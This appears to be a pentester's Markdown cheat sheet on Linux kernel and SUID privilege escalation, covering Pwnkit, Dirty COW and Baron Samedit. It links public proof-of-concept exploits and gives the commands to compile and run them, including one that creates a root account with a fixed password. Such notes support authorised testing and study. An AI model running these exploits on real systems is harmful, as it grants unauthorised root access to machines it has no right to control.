# Kernel Exploits

### Pwnkit (CVE-2021-4034, `pkexec`)

Relies on `pkexec` being SUID, double check with the following command

```bash
which pkexec
ls -al /usr/bin/pkexec
```

If pkexec is SUID: **`-rwsr-xr-x`**, expoitation is possible

- [cve-2021-4034-poc.c](https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c)
	- `gcc cve-2021-4034-poc.c -o pwn`
	- `./pwn`

Notable Links:

- https://github.com/berdav/CVE-2021-4034
- [Explination](https://www.youtube.com/watch?v=eTcVLqKpZJc)

### Dirty COW (CVE-2016-5195)

[PoC List](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

- [cowroot.c](https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c)
	- `gcc cowroot.c -o cowroot -pthread`
	- `./cowroot`
- [dirty.c](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)
	- `gcc -pthread dirty.c -o dirty -lcrypt`
	- `./dirty password123`
	- `su firefart` or `ssh firefart@...`

Notable Links:

- [Explination](https://www.youtube.com/watch?v=kEsshExn7aE)

### Baron Samedit (CVE-2021-3156, `sudo`)

Vulnerable versions:

- All legacy versions from `1.8.2` to `1.8.31p2`
- All stable versions from `1.9.0` to `1.9.5p1`

https://github.com/worawit/CVE-2021-3156

- `python3 exploit_nss_manual.py`
